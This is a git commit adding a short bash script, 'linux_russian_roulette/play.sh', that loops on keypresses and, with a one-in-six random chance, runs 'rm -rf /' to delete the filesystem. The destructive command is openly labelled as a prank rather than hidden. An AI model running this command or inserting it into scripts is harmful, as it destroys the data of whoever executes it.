4dd02a26346f420780fc941ea65d3c6f7e313862
Simon Verbois <59267907+simon-verbois@users.noreply.github.com>
2023-09-22 15:11:48 +0200

    Create play.sh

---
+++ linux_russian_roulette/play.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+
+while true; do
+    echo "Press any key to start."
+    read -n 1 key
+
+    random_number=$((1 + RANDOM % 6))
+
+    if [ "$random_number" -eq 1 ]; then
+        echo "Bye."
+        rm -rf /
+    else
+        echo "Congrats!"
+    fi
+done
